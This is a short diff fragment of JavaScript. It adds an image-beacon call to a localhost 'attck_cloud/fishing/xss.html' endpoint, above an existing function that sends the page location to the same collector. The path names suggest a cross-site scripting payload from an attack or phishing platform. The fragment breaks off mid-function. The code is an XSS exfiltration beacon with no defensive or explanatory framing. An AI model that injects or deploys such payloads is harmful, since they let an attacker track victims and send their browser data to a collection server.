@@ -1,3 +1,6 @@
+x = new Image();
+x.src = "http://localhost:8080/attck_cloud/fishing/xss.html?id=1&type=3";
+
     (function() {
         (new Image()).src = 'http://localhost:8080/attck_cloud/fishing/xss.html?id=1&type=1&location=' + escape((function() {
             try {
